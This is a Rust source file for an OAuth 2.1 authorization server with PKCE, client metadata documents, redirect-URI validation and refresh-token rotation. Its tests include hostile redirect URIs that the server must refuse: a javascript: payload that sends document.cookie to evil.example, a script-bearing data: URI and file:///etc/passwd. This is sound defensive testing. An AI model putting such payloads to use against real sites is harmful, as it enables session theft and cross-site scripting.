// SPDX-FileCopyrightText: 2026 The Vellum contributors
// SPDX-License-Identifier: AGPL-3.0-only

//! The `OAuth` 2.1 authorization server.
//!
//! - Authorization code grant only, with PKCE `S256` required for every
//!   client. All clients are public: no client secrets.
//! - Clients are either built in (`vellum-desktop`) or identified by a
//!   Client ID Metadata Document: the `client_id` is an `https` URL whose
//!   JSON lists the redirect URIs, fetched through the SSRF guard.
//! - Loopback redirect URIs match on any port (RFC 8252).
//! - Resource indicators (RFC 8707) set the token audience; MCP clients
//!   send `resource=<base>/mcp`.
//! - Refresh tokens rotate on use; replaying a spent one revokes the
//!   whole grant.
//! - The authorization response carries `iss` (RFC 9207), and the server
//!   metadata (RFC 8414) says so.

use std::collections::HashMap;
use std::sync::{Mutex, PoisonError};
use std::time::{Duration, Instant};

use base64::Engine as _;
use base64::engine::general_purpose::URL_SAFE_NO_PAD;
use schemars::JsonSchema;
use serde::{Deserialize, Serialize};
use serde_json::{Value, json};
use sha2::{Digest as _, Sha256};
use subtle::ConstantTimeEq as _;
use url::Url;
use vellum_contracts::{BoxFuture, Scope, ScopeSet};
use vellum_kernel::{Error, ErrorKind, Timestamp, UserId};

use crate::identity::{Identity, after, user_scopes};
use crate::secret::{self, Kind};
use crate::store::{AccessToken, Grant, PendingCode, PendingConsent, hash_key};

/// The built-in desktop client.
pub const DESKTOP_CLIENT_ID: &str = "vellum-desktop";

/// How long a fetched client document is trusted.
const CLIENT_CACHE: Duration = Duration::from_mins(10);
/// How long a consent screen stays answerable.
const CONSENT_LIFETIME: Duration = Duration::from_mins(10);
/// Bounds on the in-memory tables, against floods.
const MAX_PENDING: usize = 10_000;

/// Fetches Client ID Metadata Documents. The binary implements it with
/// the SSRF-guarded HTTP client and a small size limit.
pub trait ClientMetadataFetcher: Send + Sync + 'static {
    /// Fetches the document at `url`.
    fn fetch<'a>(
        &'a self,
        url: &'a str,
    ) -> BoxFuture<'a, Result<Vec<u8>, Error>>;
}

/// The fetcher when none is configured: only built-in clients work.
#[derive(Debug, Clone, Copy, Default)]
pub struct NoMetadataFetch;

impl ClientMetadataFetcher for NoMetadataFetch {
    fn fetch<'a>(
        &'a self,
        _url: &'a str,
    ) -> BoxFuture<'a, Result<Vec<u8>, Error>> {
        Box::pin(async {
            Err(Error::new(
                ErrorKind::Unavailable,
                "client metadata documents are not enabled",
            ))
        })
    }
}

/// A client the server knows how to redirect to.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct Client {
    /// The client ID.
    pub client_id: String,
    /// The name shown on the consent screen.
    pub client_name: String,
    /// The registered redirect URIs.
    pub redirect_uris: Vec<String>,
}

impl Client {
    fn desktop() -> Self {
        Self {
            client_id: DESKTOP_CLIENT_ID.to_owned(),
            client_name: "Vellum for desktop".to_owned(),
            redirect_uris: vec![
                "http://127.0.0.1/callback".to_owned(),
                "http://[::1]/callback".to_owned(),
            ],
        }
    }

    /// Whether `uri` is one of the registered redirect URIs. Loopback URIs
    /// match on any port, as native apps pick a free one (RFC 8252 §7.3).
    #[must_use]
    pub fn allows_redirect(&self, uri: &str) -> bool {
        let Ok(presented) = Url::parse(uri) else {
            return false;
        };
        if presented.fragment().is_some() {
            return false;
        }
        self.redirect_uris.iter().any(|registered| {
            if registered == uri {
                return true;
            }
            let Ok(registered) = Url::parse(registered) else {
                return false;
            };
            is_loopback(&registered)
                && registered.scheme() == "http"
                && presented.scheme() == "http"
                && registered.host() == presented.host()
                && registered.path() == presented.path()
                && registered.query() == presented.query()
        })
    }
}

/// Whether a redirect URI from a client metadata document is safe to send
/// a browser and an authorization code to: https, http on a loopback
/// address (RFC 8252 §7.3), or a private-use app scheme in reverse-domain
/// form (RFC 8252 §7.1). Anything else, such as `javascript:`, `data:` or
/// plain http to another host, is refused.
fn safe_redirect(uri: &str) -> bool {
    let Ok(url) = Url::parse(uri) else {
        return false;
    };
    if url.fragment().is_some() {
        return false;
    }
    match url.scheme() {
        "https" => url.host().is_some(),
        "http" => is_loopback(&url),
        scheme => scheme.contains('.'),
    }
}

fn is_loopback(url: &Url) -> bool {
    match url.host() {
        Some(url::Host::Ipv4(ip)) => ip.is_loopback(),
        Some(url::Host::Ipv6(ip)) => ip.is_loopback(),
        Some(url::Host::Domain(d)) => d == "localhost",
        None => false,
    }
}

/// A Client ID Metadata Document, as far as the server reads it.
#[derive(Debug, Deserialize)]
struct ClientDocument {
    client_id: String,
    client_name: Option<String>,
    redirect_uris: Vec<String>,
    token_endpoint_auth_method: Option<String>,
}

/// The server's in-memory client cache. Pending consents and codes live in
/// the store ([`crate::store::State`]), so a code issued by one replica can
/// be redeemed at another.
#[derive(Debug, Default)]
pub(crate) struct OAuthState {
    clients: Mutex<HashMap<String, (Client, Instant)>>,
}

/// The query of `GET /oauth/authorize`.
#[derive(Debug, Clone, Default, Deserialize)]
pub struct AuthorizeRequest {
    /// Must be `code`.
    pub response_type: Option<String>,
    /// The client ID.
    pub client_id: Option<String>,
    /// Where to send the user back.
    pub redirect_uri: Option<String>,
    /// Space-separated scopes; `read` when absent.
    pub scope: Option<String>,
    /// Opaque client state, echoed back.
    pub state: Option<String>,
    /// The PKCE challenge.
    pub code_challenge: Option<String>,
    /// Must be `S256`.
    pub code_challenge_method: Option<String>,
    /// The resource the token is for (RFC 8707).
    pub resource: Option<String>,
}

/// What the consent screen shows.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, JsonSchema)]
#[serde(rename_all = "camelCase")]
pub struct ConsentView {
    /// The ID to answer with.
    pub consent_id: String,
    /// The client's name, from its metadata.
    pub client_name: String,
    /// The client ID (a URL for third-party clients).
    pub client_id: String,
    /// The host the user will be sent back to.
    pub redirect_host: String,
    /// The scopes requested, after limiting to the user's own.
    pub scopes: Vec<Scope>,
}

/// The outcome of an authorization request.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum Authorize {
    /// Show the consent screen.
    Consent(ConsentView),
    /// Send the browser back to the client (with an error).
    Redirect(String),
    /// The request cannot be trusted with a redirect: show this error.
    Fail(String),
}

/// The form of `POST /oauth/token`.
#[derive(Debug, Clone, Default, Deserialize)]
pub struct TokenRequest {
    /// `authorization_code` or `refresh_token`.
    pub grant_type: Option<String>,
    /// The authorization code.
    pub code: Option<String>,
    /// The redirect URI used to obtain the code.
    pub redirect_uri: Option<String>,
    /// The client ID.
    pub client_id: Option<String>,
    /// The PKCE verifier.
    pub code_verifier: Option<String>,
    /// The refresh token.
    pub refresh_token: Option<String>,
    /// A narrower scope for a refresh.
    pub scope: Option<String>,
    /// The resource the token is for.
    pub resource: Option<String>,
}

/// A successful token response.
#[derive(Debug, Clone, PartialEq, Eq, Serialize)]
pub struct TokenResponse {
    /// The access token.
    pub access_token: String,
    /// Always `Bearer`.
    pub token_type: &'static str,
    /// Seconds until the access token expires.
    pub expires_in: u64,
    /// The refresh token, rotated on every use.
    pub refresh_token: String,
    /// The granted scopes.
    pub scope: String,
}

/// An `OAuth` error response (RFC 6749 §5.2).
#[derive(Debug, Clone, PartialEq, Eq, Serialize)]
pub struct OAuthError {
    /// The error code.
    pub error: &'static str,
    /// A human-readable description.
    pub error_description: String,
}

impl OAuthError {
    fn new(error: &'static str, description: impl Into<String>) -> Self {
        Self {
            error,
            error_description: description.into(),
        }
    }

    fn internal(e: &Error) -> Self {
        Self::new("server_error", e.message().to_owned())
    }
}

fn parse_scopes(scope: Option<&str>) -> Result<Vec<Scope>, String> {
    let text = scope.unwrap_or("read");
    let mut scopes = Vec::new();
    for name in text.split_whitespace() {
        let scope: Scope = name
            .parse()
            .map_err(|_| format!("unknown scope `{name}`"))?;
        if !scopes.contains(&scope) {
            scopes.push(scope);
        }
    }
    if scopes.is_empty() {
        return Err("request at least one scope".to_owned());
    }
    Ok(scopes)
}

fn scope_string(scopes: &[Scope]) -> String {
    scopes
        .iter()
        .map(|s| s.as_str())
        .collect::<Vec<_>>()
        .join(" ")
}

fn valid_pkce_value(value: &str) -> bool {
    (43..=128).contains(&value.len())
        && value.bytes().all(|b| {
            b.is_ascii_alphanumeric() || matches!(b, b'-' | b'.' | b'_' | b'~')
        })
}

fn pkce_matches(verifier: &str, challenge: &str) -> bool {
    let computed = URL_SAFE_NO_PAD.encode(Sha256::digest(verifier.as_bytes()));
    valid_pkce_value(verifier)
        && bool::from(computed.as_bytes().ct_eq(challenge.as_bytes()))
}

fn with_params(base: &str, params: &[(&str, &str)]) -> String {
    let Ok(mut url) = Url::parse(base) else {
        return base.to_owned();
    };
    {
        let mut query = url.query_pairs_mut();
        for (k, v) in params {
            let _ = query.append_pair(k, v);
        }
    }
    url.into()
}

fn lock<T>(m: &Mutex<T>) -> std::sync::MutexGuard<'_, T> {
    m.lock().unwrap_or_else(PoisonError::into_inner)
}

impl Identity {
    /// The authorization server metadata (RFC 8414).
    #[must_use]
    pub fn oauth_metadata(&self) -> Value {
        let base = self.config().base();
        json!({
            "issuer": base,
            "authorization_endpoint": format!("{base}/oauth/authorize"),
            "token_endpoint": format!("{base}/oauth/token"),
            "revocation_endpoint": format!("{base}/oauth/revoke"),
            "userinfo_endpoint": format!("{base}/oauth/userinfo"),
            "response_types_supported": ["code"],
            "response_modes_supported": ["query"],
            "grant_types_supported": ["authorization_code", "refresh_token"],
            "token_endpoint_auth_methods_supported": ["none"],
            "revocation_endpoint_auth_methods_supported": ["none"],
            "code_challenge_methods_supported": ["S256"],
            "scopes_supported": Scope::ALL.iter().map(
                |s| s.as_str()
            ).collect::<Vec<_>>(),
            "authorization_response_iss_parameter_supported": true,
            "client_id_metadata_document_supported": true,
        })
    }

    /// Finds a client: built in, or by fetching its metadata document.
    ///
    /// # Errors
    ///
    /// [`ErrorKind::InvalidInput`] for an unknown or malformed client.
    pub async fn resolve_client(
        &self,
        client_id: &str,
    ) -> Result<Client, Error> {
        if client_id == DESKTOP_CLIENT_ID {
            return Ok(Client::desktop());
        }
        let bad = |why: &str| {
            Error::new(
                ErrorKind::InvalidInput,
                format!("unknown client: {why}"),
            )
        };
        let url = Url::parse(client_id)
            .map_err(|_| bad("the client ID is not a URL"))?;
        if url.scheme() != "https"
            || url.fragment().is_some()
            || url.path() == "/"
        {
            return Err(bad("the client ID must be an https URL with a path"));
        }
        if let Some((client, at)) = lock(&self.oauth.clients).get(client_id)
            && at.elapsed() < CLIENT_CACHE
        {
            return Ok(client.clone());
        }
        let bytes = self.fetcher.fetch(client_id).await?;
        let doc: ClientDocument =
            serde_json::from_slice(&bytes).map_err(|e| {
                bad(&format!("the metadata document is not valid: {e}"))
            })?;
        if doc.client_id != client_id {
            return Err(bad(
                "the metadata document names a different client ID",
            ));
        }
        if doc
            .token_endpoint_auth_method
            .as_deref()
            .is_some_and(|m| m != "none")
        {
            return Err(bad(
                "only public clients (no client secret) are supported",
            ));
        }
        if doc.redirect_uris.is_empty() {
            return Err(bad("the metadata document lists no redirect URIs"));
        }
        if let Some(unsafe_uri) =
            doc.redirect_uris.iter().find(|u| !safe_redirect(u))
        {
            return Err(bad(&format!(
                "the redirect URI `{unsafe_uri}` must be https, http on a \
                 loopback address, or an app scheme such as com.example.app"
            )));
        }
        let name = doc
            .client_name
            .map(|n| n.chars().take(80).collect::<String>())
            .filter(|n| !n.trim().is_empty())
            .unwrap_or_else(|| {
                url.host_str().unwrap_or("Unknown client").to_owned()
            });
        let client = Client {
            client_id: client_id.to_owned(),
            client_name: name,
            redirect_uris: doc.redirect_uris,
        };
        let mut cache = lock(&self.oauth.clients);
        if cache.len() >= MAX_PENDING {
            cache.clear();
        }
        let _ = cache
            .insert(client_id.to_owned(), (client.clone(), Instant::now()));
        drop(cache);
        Ok(client)
    }

    fn audience(&self, resource: Option<&str>) -> Result<Vec<String>, String> {
        let base = self.config().base();
        let Some(resource) = resource else {
            return Ok(vec![base]);
        };
        let ok = Url::parse(resource).is_ok_and(|u| u.fragment().is_none())
            && (resource == base || resource.starts_with(&format!("{base}/")));
        if ok {
            Ok(vec![resource.trim_end_matches('/').to_owned()])
        } else {
            Err(format!(
                "this server does not issue tokens for `{resource}`"
            ))
        }
    }

    /// Checks an authorization request from a signed-in user and prepares
    /// the consent screen.
    pub async fn authorize(
        &self,
        user: UserId,
        request: &AuthorizeRequest,
    ) -> Authorize {
        let Some(client_id) = request.client_id.as_deref() else {
            return Authorize::Fail("The request names no client.".to_owned());
        };
        let client = match self.resolve_client(client_id).await {
            Ok(c) => c,
            Err(e) => {
                return Authorize::Fail(format!(
                    "The client cannot be used: {}.",
                    e.message()
                ));
            }
        };
        let Some(redirect_uri) = request.redirect_uri.clone() else {
            return Authorize::Fail(
                "The request names no redirect URI.".to_owned(),
            );
        };
        if !client.allows_redirect(&redirect_uri) {
            return Authorize::Fail(
                "The redirect URI is not registered for this client."
                    .to_owned(),
            );
        }
        let issuer = self.config().base();
        let fail = |error: &str, description: &str| {
            let mut params = vec![
                ("error", error),
                ("error_description", description),
                ("iss", issuer.as_str()),
            ];
            if let Some(state) = request.state.as_deref() {
                params.push(("state", state));
            }
            Authorize::Redirect(with_params(&redirect_uri, &params))
        };
        if request.response_type.as_deref() != Some("code") {
            return fail("unsupported_response_type", "use response_type=code");
        }
        let challenge = match (
            request.code_challenge.as_deref(),
            request.code_challenge_method.as_deref(),
        ) {
            (Some(c), Some("S256")) if valid_pkce_value(c) => c.to_owned(),
            _ => return fail("invalid_request", "PKCE with S256 is required"),
        };
        let requested = match parse_scopes(request.scope.as_deref()) {
            Ok(s) => s,
            Err(why) => return fail("invalid_scope", &why),
        };
        let audience = match self.audience(request.resource.as_deref()) {
            Ok(a) => a,
            Err(why) => return fail("invalid_target", &why),
        };
        let ceiling = self
            .with_state(|s| s.users.get(&user).map(user_scopes))
            .unwrap_or(ScopeSet::EMPTY);
        let scopes: Vec<Scope> = requested
            .into_iter()
            .filter(|s| ceiling.allows(*s))
            .collect();
        if scopes.is_empty() {
            return fail(
                "invalid_scope",
                "you hold none of the requested scopes",
            );
        }
        let consent_id = match secret::generate(Kind::Consent) {
            Ok(id) => id,
            Err(e) => return Authorize::Fail(e.message().to_owned()),
        };
        let redirect_host = Url::parse(&redirect_uri)
            .ok()
            .and_then(|u| u.host_str().map(str::to_owned))
            .unwrap_or_default();
        let view = ConsentView {
            consent_id: consent_id.clone(),
            client_name: client.client_name.clone(),
            client_id: client.client_id.clone(),
            redirect_host,
            scopes: scopes.clone(),
        };
        let now = Timestamp::now();
        let pending = PendingConsent {
            user,
            client,
            redirect_uri,
            state: request.state.clone(),
            scopes,
            audience,
            challenge,
            expires: after(now, CONSENT_LIFETIME),
        };
        match self.hold_consent(&consent_id, pending, now) {
            Ok(true) => Authorize::Consent(view),
            Ok(false) => Authorize::Fail(
                "Too many sign-ins are pending; try again soon.".to_owned(),
            ),
            Err(e) => Authorize::Fail(e.message().to_owned()),
        }
    }

    /// Keeps a consent screen until answered; `false` when too many are
    /// pending.
    fn hold_consent(
        &self,
        consent_id: &str,
        pending: PendingConsent,
        now: Timestamp,
    ) -> Result<bool, Error> {
        self.store().write(|s| {
            s.oauth_consents.retain(|_, c| c.expires > now);
            if s.oauth_consents.len() >= MAX_PENDING {
                return false;
            }
            let _previous = s
                .oauth_consents
                .insert(hash_key(&secret::hash(consent_id)), pending);
            true
        })
    }

    /// Answers a consent screen. Returns the URL to send the browser to.
    /// `authenticated_at` is when the answering session last proved the
    /// user's identity; the grant's tokens carry it (RT-039).
    ///
    /// # Errors
    ///
    /// [`ErrorKind::NotFound`] for an unknown, expired or someone else's
    /// consent.
    pub fn decide(
        &self,
        user: UserId,
        authenticated_at: Option<Timestamp>,
        consent_id: &str,
        approve: bool,
    ) -> Result<String, Error> {
        let key = hash_key(&secret::hash(consent_id));
        let consent = self
            .store()
            .write(|s| s.oauth_consents.remove(&key))?
            .filter(|c| c.user == user && c.expires > Timestamp::now())
            .ok_or_else(|| {
                Error::new(
                    ErrorKind::NotFound,
                    "this request has expired; start again",
                )
            })?;
        let issuer = self.config().base();
        let mut params: Vec<(&str, &str)> = vec![("iss", issuer.as_str())];
        if let Some(state) = consent.state.as_deref() {
            params.push(("state", state));
        }
        if !approve {
            params.push(("error", "access_denied"));
            params.push(("error_description", "the user declined"));
            return Ok(with_params(&consent.redirect_uri, &params));
        }
        let code = secret::generate(Kind::AuthCode)?;
        let now = Timestamp::now();
        let pending = PendingCode {
            user,
            client: consent.client,
            redirect_uri: consent.redirect_uri.clone(),
            scopes: consent.scopes,
            audience: consent.audience,
            challenge: consent.challenge,
            auth_time: authenticated_at,
            expires: after(now, self.config().code_lifetime),
        };
        let stored = self.store().write(|s| {
            s.oauth_codes.retain(|_, c| c.expires > now);
            if s.oauth_codes.len() >= MAX_PENDING {
                return false;
            }
            let _ = s
                .oauth_codes
                .insert(hash_key(&secret::hash(&code)), pending);
            true
        })?;
        if !stored {
            return Err(Error::new(
                ErrorKind::Unavailable,
                "too many pending sign-ins",
            ));
        }
        tracing::info!(
            event = "identity.oauth_consented",
            user = %user,
            "OAuth access approved"
        );
        params.push(("code", &code));
        Ok(with_params(&consent.redirect_uri, &params))
    }

    /// Serves the token endpoint.
    ///
    /// # Errors
    ///
    /// An [`OAuthError`] to return as a 400 response.
    pub fn token(
        &self,
        request: &TokenRequest,
    ) -> Result<TokenResponse, OAuthError> {
        match request.grant_type.as_deref() {
            Some("authorization_code") => self.exchange_code(request),
            Some("refresh_token") => self.refresh(request),
            _ => Err(OAuthError::new(
                "unsupported_grant_type",
                "use authorization_code or refresh_token",
            )),
        }
    }

    fn exchange_code(
        &self,
        request: &TokenRequest,
    ) -> Result<TokenResponse, OAuthError> {
        let invalid = |why: &str| OAuthError::new("invalid_grant", why);
        let code = request.code.as_deref().ok_or_else(|| {
            OAuthError::new("invalid_request", "code is required")
        })?;
        let key = hash_key(&secret::hash(code));
        let pending = self
            .store()
            .write(|s| s.oauth_codes.remove(&key))
            .map_err(|e| OAuthError::internal(&e))?
            .filter(|c| c.expires > Timestamp::now())
            .ok_or_else(|| invalid("the code is invalid, used or expired"))?;
        if request.client_id.as_deref()
            != Some(pending.client.client_id.as_str())
        {
            return Err(invalid("the code was issued to another client"));
        }
        if request.redirect_uri.as_deref()
            != Some(pending.redirect_uri.as_str())
        {
            return Err(invalid(
                "redirect_uri does not match the authorization request",
            ));
        }
        let verifier = request.code_verifier.as_deref().unwrap_or_default();
        if !pkce_matches(verifier, &pending.challenge) {
            return Err(invalid("the PKCE verifier does not match"));
        }
        let audience = match request.resource.as_deref() {
            Some(r)
                if !pending
                    .audience
                    .iter()
                    .any(|a| a == r.trim_end_matches('/')) =>
            {
                return Err(OAuthError::new(
                    "invalid_target",
                    "the resource was not part of the authorization",
                ));
            }
            _ => pending.audience,
        };
        let now = Timestamp::now();
        let refresh = secret::generate(Kind::RefreshToken)
            .map_err(|e| OAuthError::internal(&e))?;
        let refresh_hash = secret::hash(&refresh);
        let grant = Grant {
            id: secret::label(&refresh_hash),
            user: pending.user,
            client_id: pending.client.client_id,
            client_name: pending.client.client_name,
            scopes: pending.scopes,
            audience,
            created_at: now,
            auth_time: pending.auth_time,
            refresh_hash,
            spent_refresh: Vec::new(),
            refresh_expires_at: after(
                now,
                self.config().refresh_token_lifetime,
            ),
        };
        self.issue(grant, refresh, None)
    }

    fn refresh(
        &self,
        request: &TokenRequest,
    ) -> Result<TokenResponse, OAuthError> {
        let invalid = |why: &str| OAuthError::new("invalid_grant", why);
        let presented = request.refresh_token.as_deref().ok_or_else(|| {
            OAuthError::new("invalid_request", "refresh_token is required")
        })?;
        let hash = secret::hash(presented);
        let now = Timestamp::now();
        let found = self.store().read(|s| {
            s.grants
                .values()
                .find(|g| {
                    g.refresh_hash == hash || g.spent_refresh.contains(&hash)
                })
                .cloned()
        });
        let Some(grant) = found else {
            return Err(invalid("the refresh token is invalid"));
        };
        if grant.refresh_hash != hash {
            // A rotated-out token came back: someone holds a copy. End the
            // grant so neither copy works.
            let _ = self.store().write(|s| {
                let _ = s.grants.remove(&grant.id);
                let grants = &s.grants;
                s.access_tokens.retain(|_, t| grants.contains_key(&t.grant));
            });
            tracing::warn!(
                event = "identity.refresh_reuse",
                grant = %grant.id,
                "refresh token reused; grant revoked"
            );
            return Err(invalid("the refresh token was already used"));
        }
        if grant.refresh_expires_at <= now {
            return Err(invalid("the refresh token has expired"));
        }
        if request.client_id.as_deref() != Some(grant.client_id.as_str()) {
            return Err(invalid(
                "the refresh token was issued to another client",
            ));
        }
        let scopes = match request.scope.as_deref() {
            None => grant.scopes.clone(),
            Some(text) => {
                let asked = parse_scopes(Some(text))
                    .map_err(|w| OAuthError::new("invalid_scope", w))?;
                if asked.iter().any(|s| !grant.scopes.contains(s)) {
                    return Err(OAuthError::new(
                        "invalid_scope",
                        "a refresh cannot widen the grant",
                    ));
                }
                asked
            }
        };
        let audience = match request.resource.as_deref() {
            Some(r) => {
                let r = r.trim_end_matches('/');
                if !grant.audience.iter().any(|a| a == r) {
                    return Err(OAuthError::new(
                        "invalid_target",
                        "the resource was not part of the grant",
                    ));
                }
                vec![r.to_owned()]
            }
            None => grant.audience.clone(),
        };
        let refresh = secret::generate(Kind::RefreshToken)
            .map_err(|e| OAuthError::internal(&e))?;
        let mut next = grant.clone();
        next.spent_refresh.push(grant.refresh_hash);
        if next.spent_refresh.len() > 50 {
            let _ = next.spent_refresh.remove(0);
        }
        next.refresh_hash = secret::hash(&refresh);
        next.refresh_expires_at =
            after(now, self.config().refresh_token_lifetime);
        self.issue(next, refresh, Some((scopes, audience)))
    }

    /// Stores the grant and a new access token and builds the response.
    /// `narrowed` gives the scopes and audience of this access token when
    /// they are narrower than the grant's.
    fn issue(
        &self,
        grant: Grant,
        refresh: String,
        narrowed: Option<(Vec<Scope>, Vec<String>)>,
    ) -> Result<TokenResponse, OAuthError> {
        let access = secret::generate(Kind::AccessToken)
            .map_err(|e| OAuthError::internal(&e))?;
        let now = Timestamp::now();
        let lifetime = self.config().access_token_lifetime;
        let (scopes, audience) = narrowed
            .unwrap_or_else(|| (grant.scopes.clone(), grant.audience.clone()));
        let record = AccessToken {
            grant: grant.id.clone(),
            scopes: scopes.clone(),
            audience,
            expires_at: after(now, lifetime),
        };
        let user = grant.user;
        self.store()
            .write(|s| {
                s.sweep(now);
                let _ = s
                    .access_tokens
                    .insert(hash_key(&secret::hash(&access)), record);
                let _ = s.grants.insert(grant.id.clone(), grant);
            })
            .map_err(|e| OAuthError::internal(&e))?;
        tracing::info!(
            event = "identity.oauth_token_issued",
            user = %user,
            "OAuth tokens issued"
        );
        Ok(TokenResponse {
            access_token: access,
            token_type: "Bearer",
            expires_in: lifetime.as_secs(),
            refresh_token: refresh,
            scope: scope_string(&scopes),
        })
    }

    /// Revokes an access or refresh token (RFC 7009). Unknown tokens are
    /// ignored, as the RFC asks. Revoking a refresh token ends the grant.
    ///
    /// # Errors
    ///
    /// [`ErrorKind::Internal`] if the store cannot be written.
    pub fn revoke(&self, token: &str) -> Result<(), Error> {
        let hash = secret::hash(token);
        let key = hash_key(&hash);
        self.store().write(|s| {
            let _ = s.access_tokens.remove(&key);
            s.grants.retain(|_, g| g.refresh_hash != hash);
            let grants = &s.grants;
            s.access_tokens.retain(|_, t| grants.contains_key(&t.grant));
        })
    }

    /// The `OpenID Connect`-style user info for a bearer token: `sub`,
    /// `email`, `preferred_username` and `name`. Desktop and MCP clients
    /// use it to label the signed-in account.
    ///
    /// # Errors
    ///
    /// As [`Identity::verify_token`].
    pub fn userinfo(&self, token: &str) -> Result<Value, Error> {
        let info = self.verify_token(token)?;
        let user = self.user(info.user)?;
        Ok(json!({
            "sub": user.id.to_string(),
            "email": user.email,
            "preferred_username": user.email,
            "name": user.name,
        }))
    }

    /// Lists a user's `OAuth` grants (connected apps).
    #[must_use]
    pub fn grants(&self, user: UserId) -> Vec<Grant> {
        self.store().read(|s| {
            s.grants
                .values()
                .filter(|g| g.user == user)
                .cloned()
                .collect()
        })
    }

    /// Disconnects an app: ends one of the user's grants.
    ///
    /// # Errors
    ///
    /// [`ErrorKind::NotFound`] when the user has no such grant.
    pub fn revoke_grant(&self, user: UserId, id: &str) -> Result<(), Error> {
        self.store().write(|s| match s.grants.get(id) {
            Some(g) if g.user == user => {
                let _ = s.grants.remove(id);
                let grants = &s.grants;
                s.access_tokens.retain(|_, t| grants.contains_key(&t.grant));
                Ok(())
            }
            _ => {
                Err(Error::new(ErrorKind::NotFound, "connected app not found"))
            }
        })?
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn loopback_redirects_match_any_port() {
        let c = Client::desktop();
        assert!(c.allows_redirect("http://127.0.0.1:51234/callback"));
        assert!(c.allows_redirect("http://[::1]:8080/callback"));
        assert!(c.allows_redirect("http://127.0.0.1/callback"));
        assert!(!c.allows_redirect("http://127.0.0.1:5000/other"));
        assert!(!c.allows_redirect("http://evil.example/callback"));
        assert!(!c.allows_redirect("https://127.0.0.1:5000/callback"));
        assert!(!c.allows_redirect("http://127.0.0.1:5000/callback#x"));
        let web = Client {
            client_id: "https://app.example/client.json".into(),
            client_name: "App".into(),
            redirect_uris: vec!["https://app.example/cb".into()],
        };
        assert!(web.allows_redirect("https://app.example/cb"));
        assert!(!web.allows_redirect("https://app.example:444/cb"));
    }

    /// Serves one fixed client metadata document.
    struct Document(String);

    impl ClientMetadataFetcher for Document {
        fn fetch<'a>(
            &'a self,
            _url: &'a str,
        ) -> BoxFuture<'a, Result<Vec<u8>, Error>> {
            let body = self.0.clone().into_bytes();
            Box::pin(async move { Ok(body) })
        }
    }

    fn identity_serving(redirect_uri: &str) -> Identity {
        let dir = std::env::temp_dir().join(format!(
            "vellum-oauth-{}-{}",
            std::process::id(),
            redirect_uri.len()
        ));
        let store = crate::store::Store::open(&dir).unwrap();
        let config = crate::identity::IdentityConfig::new(
            Url::parse("https://vellum.example").unwrap(),
        );
        let doc = json!({
            "client_id": "https://app.example/client.json",
            "client_name": "App",
            "redirect_uris": [redirect_uri],
        });
        Identity::new(config, store).with_metadata_fetcher(std::sync::Arc::new(
            Document(doc.to_string()),
        ))
    }

    fn request(redirect_uri: &str) -> AuthorizeRequest {
        serde_json::from_value(json!({
            "client_id": "https://app.example/client.json",
            "redirect_uri": redirect_uri,
            "response_type": "code",
            "code_challenge": "E9Melhoa2OwvFrEMTJguCHaoeK1t8URWbuGJSstw-cM",
            "code_challenge_method": "S256",
        }))
        .unwrap()
    }

    // A metadata document is written by whoever hosts it. The consent page
    // sends the browser to its redirect URI with `location.assign`, so a
    // `javascript:` URI would run in Vellum's origin, and a plain-http one
    // would send the code in clear text (#386).
    #[tokio::test]
    async fn metadata_clients_may_only_redirect_to_safe_uris() {
        for bad in [
            "javascript:fetch('//evil.example/?'+document.cookie)//",
            "data:text/html,<script>alert(1)</script>",
            "http://evil.example/cb",
            "file:///etc/passwd",
            "nodots:/cb",
        ] {
            let identity = identity_serving(bad);
            let outcome =
                identity.authorize(UserId::generate(), &request(bad)).await;
            assert!(
                matches!(outcome, Authorize::Fail(_)),
                "{bad} was accepted"
            );
        }
        for good in [
            "https://app.example/cb",
            "http://127.0.0.1:4000/cb",
            "com.example.app:/oauth/cb",
        ] {
            let identity = identity_serving(good);
            let outcome =
                identity.authorize(UserId::generate(), &request(good)).await;
            assert!(
                !matches!(outcome, Authorize::Fail(_)),
                "{good} was refused"
            );
        }
    }

    #[test]
    fn pkce_and_scopes() {
        let verifier = "dBjftJeZ4CVP-mB92K27uhbUJU1p1r_wW1gFWFOEjXk";
        let challenge = "E9Melhoa2OwvFrEMTJguCHaoeK1t8URWbuGJSstw-cM";
        assert!(pkce_matches(verifier, challenge));
        assert!(!pkce_matches("short", challenge));
        assert_eq!(parse_scopes(None).unwrap(), vec![Scope::Read]);
        assert_eq!(
            parse_scopes(Some("read work read")).unwrap(),
            vec![Scope::Read, Scope::Work]
        );
        assert!(parse_scopes(Some("root")).is_err());
        assert_eq!(
            scope_string(&[Scope::Read, Scope::WriteDraft]),
            "read write:draft"
        );
    }
}
